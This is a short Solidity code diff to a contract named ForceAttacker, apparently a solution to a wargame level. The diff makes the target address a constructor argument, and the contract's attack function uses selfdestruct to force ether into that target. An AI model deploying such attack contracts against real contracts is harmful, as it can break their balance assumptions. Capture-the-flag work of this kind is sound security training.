@@ -6,7 +6,11 @@ import "./Force.sol";
 
 contract ForceAttacker {
   using SafeMath for uint256;
-  address payable target = payable(0x5AA416415245d77DC89275f18A109A004299bDde);
+  address payable target;
+
+  constructor(address payable _target) public payable {
+    target = _target;
+  }
 
   function attack() public {
     selfdestruct(target);
